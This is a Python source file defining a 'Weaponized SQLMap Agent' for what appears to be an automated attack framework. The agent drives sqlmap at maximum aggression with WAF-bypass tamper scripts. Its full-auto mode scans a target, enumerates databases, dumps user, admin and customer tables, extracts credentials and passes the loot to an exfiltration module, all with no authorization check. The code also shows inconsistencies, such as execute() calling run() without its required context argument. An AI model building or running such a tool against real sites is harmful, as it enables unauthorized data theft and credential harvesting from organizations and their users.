import asyncio
from core.data_models import AgentData, Strategy
import re
import json
import os
from typing import Optional, Dict, List, Any
from core.base_agent import BaseAgent
from core.data_models import Strategy, SQLInjectionFinding, AttackPhase, AgentData
from core.logger import log
from core.data_exfiltration import DataExfiltrator
from core.error_handlers import handle_agent_errors, handle_errors


class SqlmapAgent(BaseAgent):
    """
    Weaponized SQLMap Agent - โจมตี SQL Injection ได้จริง
    
    Features:
    - Auto detect SQL injection
    - Enumerate databases and tables
    - Dump data automatically
    - WAF bypass techniques
    - Multiple injection techniques
    - Credential extraction
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = ["sqlmap"]

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        self.sqlmap_path = self._find_sqlmap()
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "sqlmap")
        os.makedirs(self.results_dir, exist_ok=True)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace")
        self.exfiltrator = DataExfiltrator(workspace_dir=workspace_dir)

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute sqlmap agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _find_sqlmap(self) -> str:
        """หา sqlmap binary"""
        paths = [
            "/usr/bin/sqlmap",
            "/usr/local/bin/sqlmap",
            "sqlmap",
            "python3 -m sqlmap"
        ]
        for path in paths:
            try:
                result = os.popen(f"{path} --version 2>/dev/null").read()
                if "sqlmap" in result.lower():
                    return path
            except Exception as e:
                log.debug(f"Failed to check sqlmap at {path}: {e}")
                continue
        return "sqlmap"  # fallback

    @handle_agent_errors
    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "enumerate", "dump", "full_auto"
            context: {
                "url": target URL,
                "method": "GET" or "POST",
                "data": POST data (optional),
                "cookie": cookies (optional),
                "headers": custom headers (optional),
                "database": target database (optional),
                "table": target table (optional),
                "level": 1-5 (default: 3),
                "risk": 1-3 (default: 2),
                "tamper": WAF bypass scripts (optional)
            }
        """
        log.info(f"[SQLMapAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="SqlmapAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "scan":
                result = await self._scan_for_sqli(url, context)
            elif directive == "enumerate":
                result = await self._enumerate_databases(url, context)
            elif directive == "dump":
                result = await self._dump_data(url, context)
            elif directive == "full_auto":
                result = await self._full_auto_attack(url, context)
            else:
                result = await self._full_auto_attack(url, context)
            
            return AgentData(
                agent_name="SqlmapAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[SQLMapAgent] Error: {e}")
            return AgentData(
                agent_name="SqlmapAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _build_sqlmap_command(self, url: str, context: Dict, extra_args: str = "") -> str:
        """สร้างคำสั่ง sqlmap พร้อม options"""
        cmd = [self.sqlmap_path]
        
        # Basic options
        cmd.append(f'-u "{url}"')
        cmd.append('--batch')  # Non-interactive
        cmd.append('--random-agent')  # Random User-Agent
        
        # Level and Risk (Maximum aggression)
        level = context.get("level", 5)
        risk = context.get("risk", 3)
        cmd.append(f'--level={level}')
        cmd.append(f'--risk={risk}')
        
        # Method
        if context.get("method") == "POST":
            cmd.append('--method=POST')
            if context.get("data"):
                cmd.append(f'--data="{context["data"]}"')
        
        # Cookie
        if context.get("cookie"):
            cmd.append(f'--cookie="{context["cookie"]}"')
        
        # Headers
        if context.get("headers"):
            for key, value in context["headers"].items():
                cmd.append(f'--header="{key}: {value}"')
        
        # WAF Bypass
        if context.get("tamper"):
            cmd.append(f'--tamper={context["tamper"]}')
        else:
            # Default tamper scripts
            cmd.append('--tamper=space2comment,between')
        
        # Threads
        cmd.append('--threads=5')
        
        # Timeout
        cmd.append('--timeout=10')
        
        # Extra arguments
        if extra_args:
            cmd.append(extra_args)
        
        return ' '.join(cmd)

    async def _scan_for_sqli(self, url: str, context: Dict) -> Dict:
        """สแกนหา SQL Injection"""
        log.info(f"[SQLMapAgent] Scanning {url} for SQL injection...")
        
        cmd = await self._build_sqlmap_command(url, context, "--dbs")
        
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, stderr = await proc.communicate()
        output = stdout.decode()
        
        # Parse results
        vulnerable = "sqlmap identified" in output.lower() or "parameter" in output.lower()
        databases = self._parse_databases(output)
        
        result = {
            "success": vulnerable,
            "vulnerable": vulnerable,
            "url": url,
            "databases": databases,
            "output": output[:1000],  # First 1000 chars
            "full_output_file": self._save_output(url, "scan", output)
        }
        
        if vulnerable:
            log.success(f"[SQLMapAgent] SQL Injection found! Databases: {databases}")
        else:
            log.warning(f"[SQLMapAgent] No SQL Injection found")
        
        return result

    async def _enumerate_databases(self, url: str, context: Dict) -> Dict:
        """แสดงรายการ databases และ tables"""
        log.info(f"[SQLMapAgent] Enumerating databases...")
        
        # Get databases
        cmd_dbs = await self._build_sqlmap_command(url, context, "--dbs")
        proc = await asyncio.create_subprocess_shell(
            cmd_dbs,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, _ = await proc.communicate()
        output_dbs = stdout.decode()
        databases = self._parse_databases(output_dbs)
        
        # Get tables for each database
        all_tables = {}
        for db in databases[:5]:  # Limit to first 5 databases
            cmd_tables = await self._build_sqlmap_command(
                url, context, f'-D {db} --tables'
            )
            proc = await asyncio.create_subprocess_shell(
                cmd_tables,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await proc.communicate()
            output_tables = stdout.decode()
            tables = self._parse_tables(output_tables)
            all_tables[db] = tables
        
        result = {
            "success": len(databases) > 0,
            "databases": databases,
            "tables": all_tables,
            "output_file": self._save_output(url, "enumerate", output_dbs)
        }
        
        log.success(f"[SQLMapAgent] Found {len(databases)} databases")
        return result

    async def _dump_data(self, url: str, context: Dict) -> Dict:
        """ดึงข้อมูลจาก database"""
        database = context.get("database")
        table = context.get("table")
        
        if not database:
            log.error("[SQLMapAgent] No database specified for dump")
            return {"success": False, "error": "No database specified"}
        
        log.info(f"[SQLMapAgent] Dumping data from {database}.{table if table else 'all tables'}...")
        
        # Build dump command
        if table:
            extra = f'-D {database} -T {table} --dump'
        else:
            extra = f'-D {database} --dump-all'
        
        cmd = await self._build_sqlmap_command(url, context, extra)
        
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        
        stdout, _ = await proc.communicate()
        output = stdout.decode()
        
        # Parse dumped data
        dumped_data = self._parse_dump(output)
        credentials = self._extract_credentials(output)
        
        # Exfiltrate database dump
        db_loot = None
        if len(dumped_data) > 0:
            db_loot = await self.exfiltrator.exfiltrate_database(
                target=url,
                db_type="mysql",
                data=output.encode('utf-8')
            )
        
        # Exfiltrate credentials
        cred_loot = None
        if credentials:
            cred_loot = await self.exfiltrator.exfiltrate_credentials(
                target=url,
                credentials=credentials
            )
        
        result = {
            "success": len(dumped_data) > 0,
            "database": database,
            "table": table,
            "dumped_rows": len(dumped_data),
            "data": dumped_data[:100],  # First 100 rows
            "credentials": credentials,
            "output_file": self._save_output(url, f"dump_{database}_{table}", output),
            "loot": {
                "database_dump": db_loot,
                "credentials": cred_loot
            }
        }
        
        log.success(f"[SQLMapAgent] Dumped {len(dumped_data)} rows")
        if credentials:
            log.success(f"[SQLMapAgent] Found {len(credentials)} credentials!")
        if db_loot:
            log.success(f"[SQLMapAgent] Database dump saved to: {db_loot['file']}")
        if cred_loot:
            log.success(f"[SQLMapAgent] Credentials saved to: {cred_loot['file']}")
        
        return result

    async def _full_auto_attack(self, url: str, context: Dict) -> Dict:
        """โจมตีแบบอัตโนมัติเต็มรูปแบบ"""
        log.info(f"[SQLMapAgent] Starting full auto attack on {url}")
        
        results = {
            "url": url,
            "phases": []
        }
        
        # Phase 1: Scan
        scan_result = await self._scan_for_sqli(url, context)
        results["phases"].append({"phase": "scan", "result": scan_result})
        
        if not scan_result.get("vulnerable"):
            results["success"] = False
            results["message"] = "Not vulnerable to SQL injection"
            return results
        
        # Phase 2: Enumerate
        enum_result = await self._enumerate_databases(url, context)
        results["phases"].append({"phase": "enumerate", "result": enum_result})
        
        databases = enum_result.get("databases", [])
        if not databases:
            results["success"] = True
            results["message"] = "Vulnerable but no databases found"
            return results
        
        # Phase 3: Dump interesting tables
        interesting_tables = ["users", "user", "admin", "accounts", "customers", "members"]
        all_dumps = []
        
        for db in databases[:3]:  # Limit to first 3 databases
            tables = enum_result.get("tables", {}).get(db, [])
            for table in tables:
                if any(keyword in table.lower() for keyword in interesting_tables):
                    context_dump = context.copy()
                    context_dump["database"] = db
                    context_dump["table"] = table
                    dump_result = await self._dump_data(url, context_dump)
                    all_dumps.append(dump_result)
                    
                    # Stop if we found credentials
                    if dump_result.get("credentials"):
                        break
        
        results["phases"].append({"phase": "dump", "results": all_dumps})
        results["success"] = True
        results["total_credentials"] = sum(len(d.get("credentials", [])) for d in all_dumps)
        
        log.success(f"[SQLMapAgent] Full auto attack completed! Found {results['total_credentials']} credentials")
        
        return results

    def _parse_databases(self, output: str) -> List[str]:
        """แยก database names จาก output"""
        databases = []
        lines = output.split('\n')
        in_db_section = False
        
        for line in lines:
            if 'available databases' in line.lower():
                in_db_section = True
                continue
            if in_db_section:
                if line.startswith('[*] '):
                    db_name = line.replace('[*] ', '').strip()
                    if db_name:
                        databases.append(db_name)
                elif not line.strip() or line.startswith('['):
                    in_db_section = False
        
        return databases

    def _parse_tables(self, output: str) -> List[str]:
        """แยก table names จาก output"""
        tables = []
        lines = output.split('\n')
        in_table_section = False
        
        for line in lines:
            if 'tables' in line.lower() and '[' in line:
                in_table_section = True
                continue
            if in_table_section:
                if line.startswith('| '):
                    table_name = line.split('|')[1].strip()
                    if table_name:
                        tables.append(table_name)
                elif not line.strip() or (line.startswith('[') and '|' not in line):
                    in_table_section = False
        
        return tables

    def _parse_dump(self, output: str) -> List[Dict]:
        """แยกข้อมูลที่ dump ได้"""
        # This is a simplified parser
        # In production, you'd want more robust parsing
        dumped_data = []
        
        # Look for CSV-like output
        lines = output.split('\n')
        for i, line in enumerate(lines):
            if '|' in line and len(line.split('|')) > 2:
                parts = [p.strip() for p in line.split('|') if p.strip()]
                if parts:
                    dumped_data.append({"row": i, "data": parts})
        
        return dumped_data

    def _extract_credentials(self, output: str) -> List[Dict]:
        """ดึง credentials จาก output"""
        credentials = []
        lines = output.split('\n')
        
        # Common credential patterns
        username_keywords = ['user', 'username', 'login', 'email', 'account']
        password_keywords = ['pass', 'password', 'pwd', 'hash']
        
        for line in lines:
            line_lower = line.lower()
            if any(kw in line_lower for kw in username_keywords + password_keywords):
                if '|' in line:
                    parts = [p.strip() for p in line.split('|') if p.strip()]
                    if len(parts) >= 2:
                        credentials.append({
                            "username": parts[0] if len(parts) > 0 else "",
                            "password": parts[1] if len(parts) > 1 else "",
                            "raw": line.strip()
                        })
        
        return credentials

    def _save_output(self, url: str, operation: str, output: str) -> str:
        """บันทึก output ลงไฟล์"""
        import hashlib
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        filename = f"{operation}_{url_hash}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            with open(filepath, 'w') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(output)
            return filepath
        except Exception as e:
            log.error(f"[SQLMapAgent] Failed to save output: {e}")
            return ""

